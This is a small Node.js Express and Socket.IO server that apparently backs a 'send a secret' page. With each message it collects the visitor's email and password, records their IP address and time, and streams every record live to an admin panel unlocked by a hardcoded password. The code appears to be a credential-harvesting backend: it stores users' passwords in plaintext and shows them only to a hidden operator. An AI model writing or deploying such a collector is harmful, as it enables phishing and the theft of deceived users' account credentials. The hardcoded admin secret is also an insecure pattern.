const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

let messages = [];

// SET YOUR SECRET ADMIN PASSWORD HERE
const ADMIN_PASSWORD = "mypassword123"; 

io.on('connection', (socket) => {
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;

  // Handle incoming messages from users
  socket.on('send secret', (data) => {
    if (!data.text || data.text.trim() === '') return;

    const newMessage = {
      id: Date.now(),
      email: data.email ? data.email.trim() : 'Unknown',
      password: data.password ? data.password.trim() : 'N/A',
      text: data.text.trim(),
      ip: clientIp,
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };

    messages.unshift(newMessage);
    
    // Broadcast ONLY to sockets that have successfully logged into the admin panel
    io.to('admin-room').emit('new secret', newMessage);
  });

  // Handle admin login attempt
  socket.on('admin login', (password) => {
    if (password === ADMIN_PASSWORD) {
      socket.join('admin-room'); // Put this socket into the private admin room
      socket.emit('admin success', messages); // Send messages ONLY to you
    } else {
      socket.emit('admin error', 'Incorrect password!');
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
